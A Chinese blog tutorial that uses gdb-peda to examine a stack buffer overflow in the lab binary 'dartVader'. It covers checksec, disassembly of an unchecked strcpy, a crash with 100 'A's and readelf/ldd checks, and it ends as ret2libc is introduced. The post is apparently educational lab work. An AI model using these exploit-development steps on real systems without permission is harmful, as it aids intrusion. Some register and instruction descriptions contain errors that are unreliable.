-]]></content></item><item><title>使用GDB分析缓存区溢出漏洞</title><link>https://enilmalus.github.io/posts/%E4%BD%BF%E7%94%A8gdb%E5%88%86%E6%9E%90%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</link><pubDate>Wed, 31 Dec 2025 08:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E4%BD%BF%E7%94%A8gdb%E5%88%86%E6%9E%90%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</guid><description>gdb-peda 分析 peda 是 Python Exploit Development Assistance 的缩写，这个工具是建立在 GDB 之上的，用 Python 编写的，旨在位利用开发提供版主。其设计初衷是为了让漏洞分析和利用开发过程更加直观高效，通过增强 GDB 的功能，如改进的堆栈、寄存器和内存显示，以及针对二进制分析和漏洞挖掘的实用工具，帮助安全研究人员更快地理解和利用程序中的漏洞。由于利用开发往往需要细致地分析程序执行状态、内存布局反编译代码，gdb-peda 的这些增强功能就显得尤为重要，能大大提升调试和漏洞利用的效率。
-gdb-peda 下载 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo apt install gdb-peda gdb-peda is already the newest version (1.2-0kali2). The following packages were automatically installed and are no longer required: gcc-14-base:i386 libblkid-dev libgio-2.0-dev-bin libicu-dev libpython3.12-minimal libsepol-dev native-architecture python3-poetry-dynamic-versioning python3.12-tk gir1.2-girepository-2.0 libflac12t64 libgirepository-1.0-1 liblbfgsb0 libpython3.12-stdlib libsysprof-capture-4-dev python3-aioconsole python3-pywerview ruby-zeitwerk girepository-tools libfuse3-3 libglapi-mesa libplacebo349 libpython3.12t64 libutempter0 python3-dunamai python3-setproctitle strongswan icu-devtools libgeos3.</description><content type="html"><![CDATA[<h2 id="gdb-peda-分析">gdb-peda 分析</h2>
-<p>peda 是 Python Exploit Development Assistance 的缩写，这个工具是建立在 GDB 之上的，用 Python 编写的，旨在位利用开发提供版主。其设计初衷是为了让漏洞分析和利用开发过程更加直观高效，通过增强 GDB 的功能，如改进的堆栈、寄存器和内存显示，以及针对二进制分析和漏洞挖掘的实用工具，帮助安全研究人员更快地理解和利用程序中的漏洞。由于利用开发往往需要细致地分析程序执行状态、内存布局反编译代码，gdb-peda 的这些增强功能就显得尤为重要，能大大提升调试和漏洞利用的效率。</p>
-<h3 id="gdb-peda-下载">gdb-peda 下载</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ sudo apt install gdb-peda
-</span></span><span style="display:flex;"><span>gdb-peda is already the newest version <span style="color:#f92672">(</span>1.2-0kali2<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>The following packages were automatically installed and are no longer required:
-</span></span><span style="display:flex;"><span>  gcc-14-base:i386         libblkid-dev   libgio-2.0-dev-bin     libicu-dev     libpython3.12-minimal  libsepol-dev              native-architecture  python3-poetry-dynamic-versioning  python3.12-tk
-</span></span><span style="display:flex;"><span>  gir1.2-girepository-2.0  libflac12t64   libgirepository-1.0-1  liblbfgsb0     libpython3.12-stdlib   libsysprof-capture-4-dev  python3-aioconsole   python3-pywerview                  ruby-zeitwerk
-</span></span><span style="display:flex;"><span>  girepository-tools       libfuse3-3     libglapi-mesa          libplacebo349  libpython3.12t64       libutempter0              python3-dunamai      python3-setproctitle               strongswan
-</span></span><span style="display:flex;"><span>  icu-devtools             libgeos3.13.0  libglib2.0-dev-bin     libpoppler145  librav1e0.7            libx264-164               python3-nfsclient    python3-tomlkit
-</span></span><span style="display:flex;"><span>Use <span style="color:#e6db74">&#39;sudo apt autoremove&#39;</span> to remove them.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Summary:
-</span></span><span style="display:flex;"><span>  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: <span style="color:#ae81ff">1420</span>
-</span></span></code></pre></div><h3 id="启动分析">启动分析</h3>
-<p>寻找 peda 存放位置</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ locate gdb-peda
-</span></span><span style="display:flex;"><span>/usr/share/gdb-peda
-</span></span><span style="display:flex;"><span>/usr/share/doc/gdb-peda
-</span></span><span style="display:flex;"><span>/usr/share/doc/gdb-peda/README.Debian
-</span></span><span style="display:flex;"><span>/usr/share/doc/gdb-peda/README.md
-</span></span><span style="display:flex;"><span>/usr/share/doc/gdb-peda/changelog.Debian.gz
-</span></span><span style="display:flex;"><span>/usr/share/doc/gdb-peda/copyright
-</span></span><span style="display:flex;"><span>/usr/share/gdb-peda/lib
-</span></span><span style="display:flex;"><span>/usr/share/gdb-peda/peda.py
-</span></span><span style="display:flex;"><span>/usr/share/gdb-peda/lib/config.py
-</span></span><span style="display:flex;"><span>/usr/share/gdb-peda/lib/nasm.py
-</span></span><span style="display:flex;"><span>/usr/share/gdb-peda/lib/shellcode.py
-</span></span><span style="display:flex;"><span>/usr/share/gdb-peda/lib/six.py
-</span></span><span style="display:flex;"><span>/usr/share/gdb-peda/lib/skeleton.py
-</span></span><span style="display:flex;"><span>/usr/share/gdb-peda/lib/utils.py
-</span></span><span style="display:flex;"><span>/var/lib/dpkg/info/gdb-peda.list
-</span></span><span style="display:flex;"><span>/var/lib/dpkg/info/gdb-peda.md5sums
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ ls /usr/share/gdb-peda   
-</span></span><span style="display:flex;"><span>lib  peda.py
-</span></span></code></pre></div><p>启动 peda</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ gdb dartVader                                                   
-</span></span><span style="display:flex;"><span>GNU gdb <span style="color:#f92672">(</span>Debian 16.3-1<span style="color:#f92672">)</span> 16.3
-</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2024</span> Free Software Foundation, Inc.
-</span></span><span style="display:flex;"><span>License GPLv3+: GNU GPL version <span style="color:#ae81ff">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
-</span></span><span style="display:flex;"><span>This is free software: you are free to change and redistribute it.
-</span></span><span style="display:flex;"><span>There is NO WARRANTY, to the extent permitted by law.
-</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;show copying&#34;</span> and <span style="color:#e6db74">&#34;show warranty&#34;</span> <span style="color:#66d9ef">for</span> details.
-</span></span><span style="display:flex;"><span>This GDB was configured as <span style="color:#e6db74">&#34;x86_64-linux-gnu&#34;</span>.
-</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;show configuration&#34;</span> <span style="color:#66d9ef">for</span> configuration details.
-</span></span><span style="display:flex;"><span>For bug reporting instructions, please see:
-</span></span><span style="display:flex;"><span>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
-</span></span><span style="display:flex;"><span>Find the GDB manual and other documentation resources online at:
-</span></span><span style="display:flex;"><span>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>For help, type <span style="color:#e6db74">&#34;help&#34;</span>.
-</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;apropos word&#34;</span> to search <span style="color:#66d9ef">for</span> commands related to <span style="color:#e6db74">&#34;word&#34;</span>...
-</span></span><span style="display:flex;"><span>pwndbg: loaded <span style="color:#ae81ff">201</span> pwndbg commands. Type pwndbg <span style="color:#f92672">[</span>filter<span style="color:#f92672">]</span> <span style="color:#66d9ef">for</span> a list.
-</span></span><span style="display:flex;"><span>pwndbg: created <span style="color:#ae81ff">13</span> GDB functions <span style="color:#f92672">(</span>can be used with print/break<span style="color:#f92672">)</span>. Type help <span style="color:#66d9ef">function</span> to see them.
-</span></span><span style="display:flex;"><span>Reading symbols from dartVader...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in dartVader<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>------- tip of the day <span style="color:#f92672">(</span>disable with set show-tips off<span style="color:#f92672">)</span> -------
-</span></span><span style="display:flex;"><span>Use patch &lt;address&gt; <span style="color:#e6db74">&#39;&lt;assembly&gt;&#39;</span> to patch an address with given assembly code
-</span></span><span style="display:flex;"><span>pwndbg&gt; source /usr/share/gdb-peda/peda.py
-</span></span><span style="display:flex;"><span>gdb-peda$ 
-</span></span></code></pre></div><h4 id="checksec">checksec</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb-peda$ checksec
-</span></span><span style="display:flex;"><span>CANARY    : disabled
-</span></span><span style="display:flex;"><span>FORTIFY   : disabled
-</span></span><span style="display:flex;"><span>NX        : ENABLED
-</span></span><span style="display:flex;"><span>PIE       : disabled
-</span></span><span style="display:flex;"><span>RELRO     : Partial
-</span></span></code></pre></div><p>checksec 的结果反映了目标二进制文件在安全机制上的设置情况，既有不足也有一定的保护。首先，CANARY 和 FORTIFY 被禁用了，这意味着在栈溢出和缓冲区保护方面缺乏内置防护，我们可能利用这些缺陷进行溢出攻击；而 NX 是启用的状态，这会使得某些内存区域（如堆和栈）无法执行代码，从而对注入型攻击提供了一些保护。但同时， PIE 没有启用，说明程序的加载地址是固定的，这在一定程度上降低了地址随机化（aslr）带来的安全优势；RELRO 只处于部分保护状态，未能完全锁定重定位信息，使得部分内存泄漏或修改攻击仍有可能实现。</p>
-<h5 id="canary栈保护金丝雀">CANARY（栈保护金丝雀）</h5>
-<p>CANARY 是在函数返回地址前放置的一个哨兵值，用于检测栈溢出，如果这个值被破坏则说明缓冲区溢出已经发生。编辑器会在函数开始时在栈上防止一个随机值，函数返回前检查这个值是否被改动，如果被改动则终止程序，如果关闭则可能被攻击者直接覆盖返回地址。</p>
-<h5 id="fortify源码加固">FORTIFY（源码加固）</h5>
-<p>FORTITY 会检查危险函数，在运行时检测缓冲区溢出，如果检测到溢出即将发生则终止程序，如果关闭使用不安全函数时容易出问题。</p>
-<h5 id="nx不可执行位">NX（不可执行位）</h5>
-<p>NX（No eXecute），也叫 DEP，将内存区域标记为数据或指令。启用后栈和堆上的数据无法作为代码执行，如果攻击者将 shellcode 注入到栈上 CPU 也会拒绝执行，如果开启则必须使用 ROP 等技术绕过。</p>
-<h5 id="pie位置无关可执行文件">PIE（位置无关可执行文件）</h5>
-<p>PIE 配合 ASLR（地址空间分布随机化）使用，让程序每次运行时加载到内存的随机位置。这样攻击者无法预测函数、变量的具体地址，大大增加利用难度。</p>
-<h5 id="relro重定位只读">RELRO（重定位只读）</h5>
-<p>RELRO 保护 GOT（全局偏移表）不被改写，有两种模式：</p>
-<ol>
-<li>Partial RELRO（部分）：将 GOT 放在 BSS 段前面，防止全局变量溢出覆盖 GOT，但本身仍可写。</li>
-<li>Full RELRO（完全）：在程序启动时解析所有符号并将整个 GOT 标记为只读，彻底防止 GTO 改写攻击。</li>
-</ol>
-<h4 id="disassemble">disassemble</h4>
-<p>主函数反汇编分析：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb-peda$ disassemble main
-</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
-</span></span><span style="display:flex;"><span>   0x0804844d &lt;+0&gt;:     push   ebp
-</span></span><span style="display:flex;"><span>   0x0804844e &lt;+1&gt;:     mov    ebp,esp
-</span></span><span style="display:flex;"><span>   0x08048450 &lt;+3&gt;:     and    esp,0xfffffff0
-</span></span><span style="display:flex;"><span>   0x08048453 &lt;+6&gt;:     sub    esp,0x50
-</span></span><span style="display:flex;"><span>   0x08048456 &lt;+9&gt;:     cmp    DWORD PTR <span style="color:#f92672">[</span>ebp+0x8<span style="color:#f92672">]</span>,0x1
-</span></span><span style="display:flex;"><span>   0x0804845a &lt;+13&gt;:    jne    0x8048470 &lt;main+35&gt;
-</span></span><span style="display:flex;"><span>   0x0804845c &lt;+15&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>,0x8048520
-</span></span><span style="display:flex;"><span>   0x08048464 &lt;+23&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x1
-</span></span><span style="display:flex;"><span>   0x0804846b &lt;+30&gt;:    call   0x8048340 &lt;errx@plt&gt;
-</span></span><span style="display:flex;"><span>   0x08048470 &lt;+35&gt;:    mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp+0xc<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>   0x08048473 &lt;+38&gt;:    add    eax,0x4
-</span></span><span style="display:flex;"><span>   0x08048476 &lt;+41&gt;:    mov    eax,DWORD PTR <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>   0x08048478 &lt;+43&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>,eax
-</span></span><span style="display:flex;"><span>   0x0804847c &lt;+47&gt;:    lea    eax,<span style="color:#f92672">[</span>esp+0x10<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>   0x08048480 &lt;+51&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,eax
-</span></span><span style="display:flex;"><span>   0x08048483 &lt;+54&gt;:    call   0x8048310 &lt;strcpy@plt&gt;
-</span></span><span style="display:flex;"><span>   0x08048488 &lt;+59&gt;:    leave
-</span></span><span style="display:flex;"><span>   0x08048489 &lt;+60&gt;:    ret
-</span></span><span style="display:flex;"><span>End of assembler dump.
-</span></span></code></pre></div><p>这个是 x86 汇编语言呈现的 main 函数的底层指令序列。下面来拆解这段代码的功能与逻辑。</p>
-<p>第一行输出分为四个部分：
-第一部分是实际内存地址，例如 <code>0x0804844d</code>，表明该指令存放在内存中的具体位置；
-第二部分是函数内偏移量，如 <code>&lt;+&gt;:</code>，表示该指令距离函数入口的字节数；
-第三部分显示的是汇编指令助记符，比如 <code>push</code>、<code>mov</code> 等，指明了执行的具体操作；
-第四部分是操作数，例如 <code>esp,0x50</code>，详细说明了指令操作的寄存器或内存地址。</p>
-<p>整体上，这段代码是一个 C 程序的 main 函数的汇编表示。它检查命令行参数的数量，并在满足特定条件时调用 errx 函数（报错退出），否则将某个命令行参数复制到一个栈上的缓冲区中（通过 strcpy）。</p>
-<h5 id="汇编语言基础">汇编语言基础</h5>
-<table>
-<thead>
-<tr>
-<th>汇编命令</th>
-<th>命令来源</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>push</td>
-<td>Push（推）</td>
-<td>将操作数压入栈顶，栈指针（esp）减小，通常用于保存寄存器值或传递参数。</td>
-</tr>
-<tr>
-<td>mov</td>
-<td>Move（移动）</td>
-<td>将源操作数的值复制到目标操作数，可以是寄存器、内存或立即数，用于数据传输。</td>
-</tr>
-<tr>
-<td>and</td>
-<td>And（与）</td>
-<td>对两个操作数执行按位与运算，结果存入目标操作数，常用于位操作或地址对齐。</td>
-</tr>
-<tr>
-<td>sub</td>
-<td>Subtract（减）</td>
-<td>从目标操作数中减去源操作数，结果存入目标操作数，用于计算或调整栈指针。</td>
-</tr>
-<tr>
-<td>cmp</td>
-<td>Compare（比较）</td>
-<td>比较两个操作数，通过减法设立标志位（不保存结果），用于条件判断。</td>
-</tr>
-<tr>
-<td>jne</td>
-<td>Jump if Not Equal（不相等则跳转）</td>
-<td>如果不相等（零标志 ZF=0），跳转到指定地址，用于算数运算或地址偏移。</td>
-</tr>
-<tr>
-<td>call</td>
-<td>Call（调用）</td>
-<td>调整子程序，将下一条指令地址压栈并跳转到目标地址，常用于函数调用。</td>
-</tr>
-<tr>
-<td>add</td>
-<td>Add（加）</td>
-<td>将源操作数加到目标操作数上，结果存入目标操作数，用于算数运算或地址偏移。</td>
-</tr>
-<tr>
-<td>lea</td>
-<td>Load Effective Address（加载有效地址）</td>
-<td>计算有效地址并存入寄存器，不访问内存，仅用于地址计算。</td>
-</tr>
-<tr>
-<td>leave</td>
-<td>Leave（离开）</td>
-<td>恢复调用者的栈帧，相当于 mov esp,ebp 后 pop ebp，用于函数返回前的栈清理</td>
-</tr>
-<tr>
-<td>ret</td>
-<td>Return（返回）</td>
-<td>从栈顶弹出返回地址并跳转到该地址，结束当前函数执行。</td>
-</tr>
-</tbody>
-</table>
-<table>
-<thead>
-<tr>
-<th>寄存器</th>
-<th>寄存器来源/全拼</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>ebp</td>
-<td>Extended Base Pointer（扩展基指针）</td>
-<td>基指针寄存器，通常保存当前函数的栈帧地址，用于访问局部变量、参数或维护栈帧结构。</td>
-</tr>
-<tr>
-<td>esp</td>
-<td>Extended Stack Pointer（扩展栈指针）</td>
-<td>栈指针寄存器，指向当前栈顶，用于管理栈的增长和收缩（如分配空间或传递参数）。</td>
-</tr>
-<tr>
-<td>eax</td>
-<td>Extended Accumulator（扩展累加器）</td>
-<td>累加器寄存器，常用于存储函数返回值、算数运算结果或作为通用数据寄存器。</td>
-</tr>
-<tr>
-<td>ebx</td>
-<td>Extended Base（扩展基址寄存器）</td>
-<td>基址寄存器，通用寄存器，常用于存储内存地址或数据，在某些调用约定中需要被调用者保存。</td>
-</tr>
-<tr>
-<td>ecx</td>
-<td>Extended Counter（扩展计数器）</td>
-<td>计数器寄存器，常用于循环计数（如 loop 指令）、字符串操作或作为同样寄存器。</td>
-</tr>
-<tr>
-<td>edx</td>
-<td>Extended Data（扩展数据寄存器）</td>
-<td>数据寄存器，常用于存储数据、I/O 操作，在乘除法中与 eax 配合存储扩展结果。</td>
-</tr>
-<tr>
-<td>esi</td>
-<td>Extended source Index（扩展源索引）</td>
-<td>源索引寄存器，常用于字符串操作的源地址指针或数组访问</td>
-</tr>
-<tr>
-<td>edi</td>
-<td>Extended Destination Index（扩展目标索引）</td>
-<td>目标索引寄存器，常用于字符串操作的目标地址指针或数组访问。</td>
-</tr>
-<tr>
-<td>dip</td>
-<td>Extended Instruction Pointer（扩展指令指针）</td>
-<td>指令指针寄存器，指向下一条要执行的指令地址，不能直接修改，只能通过跳转/调用命令改变。</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p>以上内容如使用 pwngdb 原理相同。</p>
-</blockquote>
-<h2 id="手工测试缓冲区溢出漏洞">手工测试缓冲区溢出漏洞</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ /bin/dartVader
-</span></span><span style="display:flex;"><span>dartVader: Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>erso@deathStar1:~$ /bin/dartVader -h
-</span></span><span style="display:flex;"><span>erso@deathStar1:~$ /bin/dartVader asdsdadfgeyghujfgeahjkfghaekhfhaeukjfhjaelif
-</span></span><span style="display:flex;"><span>erso@deathStar1:~$ /bin/dartVader <span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#39;print(&#34;A&#34;*10)&#39;</span><span style="color:#66d9ef">)</span>
-</span></span><span style="display:flex;"><span>erso@deathStar1:~$ /bin/dartVader <span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#39;print(&#34;A&#34;*100)&#39;</span><span style="color:#66d9ef">)</span>
-</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>发现报错，Segmentation fault （段错误）。程序试图访问非法的内存地址，例如读取或写入未分配的内存、访问超出数组边界的内存、解引用空指针（null pointer）或未初始化的指针、访问受保护的系统内存区域等情形就会报这个错误。操作系统检测到这种非法操作后，会触发 “段错误” 并中止程序运行。而 ”Core Dumped（核心转储）“ 则表示，当段错误发生时，系统可能会生成一个 ”核心转储（core dump）“，记录程序崩溃时的内存状态。</p>
-<p>/bin/dartVader 在处理 100 个 A 输入时访问了非法内存，很可能是由于缓冲区溢出或未正确处理长输入导致的。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ dmesg |tail
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   10.915276<span style="color:#f92672">]</span> audit: type<span style="color:#f92672">=</span><span style="color:#ae81ff">1400</span> audit<span style="color:#f92672">(</span>1767178920.659:12<span style="color:#f92672">)</span>: apparmor<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;STATUS&#34;</span> operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;profile_replace&#34;</span> profile<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;unconfined&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/lib/connman/scripts/dhclient-script&#34;</span> pid<span style="color:#f92672">=</span><span style="color:#ae81ff">949</span> comm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;apparmor_parser&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   10.915355<span style="color:#f92672">]</span> audit: type<span style="color:#f92672">=</span><span style="color:#ae81ff">1400</span> audit<span style="color:#f92672">(</span>1767178920.659:13<span style="color:#f92672">)</span>: apparmor<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;STATUS&#34;</span> operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;profile_replace&#34;</span> profile<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;unconfined&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/lib/connman/scripts/dhclient-script&#34;</span> pid<span style="color:#f92672">=</span><span style="color:#ae81ff">949</span> comm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;apparmor_parser&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   10.917154<span style="color:#f92672">]</span> audit: type<span style="color:#f92672">=</span><span style="color:#ae81ff">1400</span> audit<span style="color:#f92672">(</span>1767178920.659:14<span style="color:#f92672">)</span>: apparmor<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;STATUS&#34;</span> operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;profile_load&#34;</span> profile<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;unconfined&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/sbin/tcpdump&#34;</span> pid<span style="color:#f92672">=</span><span style="color:#ae81ff">951</span> comm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;apparmor_parser&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   11.063447<span style="color:#f92672">]</span> init: Failed to spawn thermald main process: unable to execute: No such file or directory
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   11.604512<span style="color:#f92672">]</span> ip_tables: <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> 2000-2006 Netfilter Core Team
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   11.654002<span style="color:#f92672">]</span> ip6_tables: <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> 2000-2006 Netfilter Core Team
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   11.865732<span style="color:#f92672">]</span> init: plymouth-upstart-bridge main process ended, respawning
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 2566.209708<span style="color:#f92672">]</span> pcnet32 0000:02:01.0 eth0: link down
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 2576.209677<span style="color:#f92672">]</span> pcnet32 0000:02:01.0 eth0: link up
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 6771.328578<span style="color:#f92672">]</span> dartVader<span style="color:#f92672">[</span>2743<span style="color:#f92672">]</span>: segfault at <span style="color:#ae81ff">41414141</span> ip <span style="color:#ae81ff">41414141</span> sp bf80b560 error <span style="color:#ae81ff">14</span>
-</span></span></code></pre></div><blockquote>
-<p>dmesg（diagnostic message）用于查看和打印 Linux 内核的消息缓冲。</p>
-</blockquote>
-<p>最后一行与 dartVader 相关。/bin/dartVader（PID 2743）在时间戳 6771.328578 秒发生了段错误（segfault）。具体来说，错误发生在内存地址 0x41414141，该地址在十六进制下转换为 ASCII 是 AAAA，正是我们测试的内容，程序试图执行这个非法地址的指令，但它是我们输入的数据而非有效代码；栈指针 esp 为 0xbf80b560，记录了崩溃时的栈位置；错误码 14 表示页面错误（page fault），具体是访问了不可执行的内存区域。</p>
-<p>可以确认有缓冲区溢出漏洞。一般来说缓冲区溢出漏洞，要写入 shellcode，这样看安全机制是否允许写入。所以利用还要看有什么安全机制，者关乎我们的利用方式和利用是否能成功。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ readelf -W -l /bin/dartVader | grep GNU_STACK
-</span></span><span style="display:flex;"><span>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
-</span></span></code></pre></div><p>readelf 是用于查看 ELF（Executable and Linkable Format）格式文件信息的工具，ELF 是 Linux 下可执行文件、目标文件和共享库的标准格式。-l 参数显示程序头，-W 参数使用宽行输出，不截断过长的行，便于查看完整信息。</p>
-<p>GNU_STACK 的权限是 RW（可读可写），没可以 X（可执行）。这意味着该程序的堆栈被标记为不可执行。这是现代操作系统中常见的安全特性（称为 NX 或 DEP，Data Execution Pervention），用于防止缓冲区溢出攻击中将恶意代码注入堆栈并执行。也可以在 Kali 中使用 scanelf 检查相关属性。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ scanelf -e dartVader 
-</span></span><span style="display:flex;"><span> TYPE   STK/REL/PTL FILE 
-</span></span><span style="display:flex;"><span>ET_EXEC RW- R-- RW- dartVader 
-</span></span></code></pre></div><h2 id="链接动态库依赖情况">链接动态库依赖情况</h2>
-<p>查看程序的动态链接库：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ ldd /bin/dartVader 
-</span></span><span style="display:flex;"><span>        linux-gate.so.1 <span style="color:#f92672">=</span>&gt;  <span style="color:#f92672">(</span>0xb76e6000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb752a000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        /lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xb76e8000<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>ldd 检查 /bin/dartVader 所依赖的共享库，ldd 命令会解析该程序的动态链接信息，并列出所有需要在运行时加载的库。输入中显示了 linux-gate.so.1、libc.so.6 以及动态加载器 /lib/ld-linux.so.2，这证明程序是动态链接的，并依赖这些系统库才能正常运行。从安全角度来看，这有助于了解目标程序的运行环境和潜在攻击面，比如库版本是否存在漏洞或是否容易被替换，从而为渗透测试提供信息。</p>
-<p>libc 是指标准 C 库，是大多数 C 程序赖以运作的基础库，它包含了大量用于内存管理、字符串处理、文件操作、数学计算以及系统调用等常见功能。在 Linux 系统中，glibc 是 GNU 实现的 libc，它提供了与操作系统交互所必需的接口。大多数程序在运行时都需要调用 libc 中的函数，而在漏洞利用中，这些函数（比如 system）的位置常常成为攻击链的重要环节，被攻击者利用来实现诸如 ret2libc 的攻击手段，这种类型的攻击叫 ret2libc。</p>
-<h3 id="ret2libc-介绍">ret2libc 介绍</h3>
